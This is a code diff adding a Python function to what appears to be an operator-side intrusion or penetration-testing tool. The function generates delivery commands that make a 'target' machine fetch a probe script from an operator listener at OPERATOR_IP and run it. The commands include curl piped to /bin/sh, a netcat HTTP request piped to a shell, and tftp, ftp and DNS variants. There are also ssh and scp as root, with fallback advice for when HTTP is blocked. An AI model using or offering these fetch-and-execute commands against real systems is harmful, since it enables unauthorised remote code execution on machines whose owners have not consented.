@@ -123,6 +123,51 @@ def render_probe_base64_paste(script_text):
     return "\n".join(lines)
 
 
+def render_probe_delivery(cfg):
+    """Render target-side probe delivery options."""
+    wget_cmd = render_probe_command(cfg)
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    route = probe_route_context(cfg)
+    route_host = str(route.get("host", "OPERATOR_IP") or "OPERATOR_IP")
+    route_port = int(route.get("port", 22207) or 22207)
+    url = f"http://{route_host}:{route_port}/{script_name}"
+    curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
+    tftp_cmd = render_probe_tftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
+    ftp_cmd = render_probe_ftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_FTP_PORT", 22209))
+    dns_cmd = render_probe_dns_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_DNS_PORT", 22210))
+    nc_cmd = (
+        "printf 'GET /"
+        + script_name.replace("'", "")
+        + " HTTP/1.0\\r\\nHost: "
+        + route_host.replace("'", "")
+        + "\\r\\n\\r\\n' | nc "
+        + shquote(route_host)
+        + " "
+        + shquote(str(route_port))
+        + " | sed '1,/^\\r*$/d' | /bin/sh"
+    )
+    return "\n".join([
+        "",
+        "  Delivery options (pick what the target has):",
+        f"    wget:  {wget_cmd}",
+        f"    curl:  {curl_cmd}",
+        f"    tftp:  {tftp_cmd}",
+        f"    ftp:   {ftp_cmd}",
+        f"    dns:   {dns_cmd}",
+        f"    nc:    {nc_cmd}",
+        f"    ssh:   ssh root@target '{wget_cmd}'",
+        f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'",
+        "    paste: probe paste",
+        "",
+        "  Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns",
+        "  DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.",
+        "  If HTTP is blocked but nc works, use the nc command above against the same listener.",
+        "  If the target only has a serial/admin shell, use: probe paste",
+        "",
+        "  probe results  — after running any of the above",
+    ])
+
+
 def render_probe_command(cfg, host=None, port=None):
     script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
     route = probe_route_context(cfg, host=host, port=port)
